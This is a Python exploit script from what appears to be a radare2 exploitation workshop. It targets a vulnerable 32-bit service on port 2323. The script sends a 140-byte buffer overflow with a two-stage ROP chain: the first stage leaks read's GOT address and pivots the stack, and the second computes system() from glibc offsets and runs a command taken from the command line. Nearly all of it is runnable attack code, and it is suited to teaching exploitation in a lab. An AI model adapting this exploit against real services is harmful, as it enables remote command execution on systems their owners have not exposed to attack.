import socket
import struct
import time
import sys

# radare2 exploitation workshop
# (losely based on work from Eindbazen and Crowell)


def rop(*args):
    return struct.pack('I'*len(args), *args)


readplt = 0x804832c
writeplt = 0x804830c
read_got = 0x0804961c
vuln_func = 0x080483F4
write_addr = 0x08049524  # where we're going to write

#gadgets
pop3ret = 0x080484b6
popebpret = 0x080484e8
leaveret = 0x080482ea

# vm glibc offsets
read_local = 0xd9d00
system_local = 0x3e2c0

# local glibc offsets
read_local = 0xdb1b0
system_local = 0x3e770
exit_local = 0x314a0

cmd = 'ls'
if len(sys.argv) == 2:
    cmd = sys.argv[1]

system_offset = read_local - system_local

#s = socket.create_connection(('192.168.1.148', 2323))
s = socket.create_connection(('127.0.0.1', 2323))

print('[+] Sending stage1 (leak + write payload)')
s.send('A'*140 + rop(
    writeplt,
    pop3ret,
    1,  # stdout
    read_got,
    4,  # size of a pointer

    readplt,     # read(2)
    pop3ret,
    0,           # stdin
    write_addr,  # where to write
    512,

	# This may seem convoluted, but it will simply
	# jumps to write_addr. This is a classic trick.
    popebpret,
    write_addr,
    leaveret  # one byte alias for mov esp, ebp ; pop ebp then ret # Equivalent to a function epilog
))

# receive leaked address of read
leaked_got = struct.unpack('I', s.recv(4))[0]
print('[*] GOT at 0x%08x' % leaked_got)

# calculate address of system using the leaked offset
system = leaked_got - system_offset
print("[*] system(2) at 0x%08x" % system)

# second stage ROP payload
print('[+] Sending stage2 (call)')
buf = rop(
    0x42424242,  # new value of ebp, we don't care

    # call system
    system,
    0x43434343,  # We don't care
    write_addr + 4*4  # 16 because we skip len(stage2) for our stack
) + cmd + '\0'

s.send(buf)

print('[+] Reading the result')
print s.recv(9999)
s.close()
